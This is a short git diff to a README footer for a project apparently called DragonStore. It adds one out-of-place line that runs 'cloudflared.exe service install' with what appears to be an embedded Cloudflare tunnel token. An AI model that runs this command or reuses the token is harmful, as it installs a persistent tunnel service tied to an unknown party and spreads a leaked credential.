@@ -205,5 +205,6 @@ DragonStore/
 
 **تطوير وهندسة برمجية بواسطة شركة دراجون للأنظمة الأمنية**  
 *جميع الحقوق محفوظة © 2026 - Dragon Security Systems & Software Solutions*
+cloudflared.exe service install eyJhIjoiMzM3MWMyMTc2OGFmZjk4ZWM1ZjgyMDhiZWYzMDI2MmQiLCJ0IjoiODNjODlmOTYtNTNmMi00OTFjLTlhMDgtNmVmODkyOTE1N2JkIiwicyI6IllUQXpNR1F3WXpBdFlqTTBOeTAwTlRkbExXSTJNR010WTJZNU56VmhNelV4TTJWaiJ9
 
 </div>
